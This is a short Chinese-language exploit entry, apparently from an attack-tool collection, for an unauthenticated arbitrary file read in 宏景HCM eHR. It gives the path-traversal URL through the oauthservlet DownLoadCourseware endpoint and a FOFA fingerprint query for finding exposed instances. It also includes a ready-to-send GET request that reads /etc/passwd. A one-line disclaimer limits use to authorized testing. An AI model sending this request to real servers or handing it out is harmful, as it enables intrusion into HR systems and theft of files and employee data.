---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM DownLoadCourseware 任意文件读取漏洞

## 漏洞描述

宏景HCM 经 `/w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware` 目录穿越未授权访问，`url` 参数任意文件读取。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=/etc/passwd HTTP/1.1
```

响应直接返回目标文件内容。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
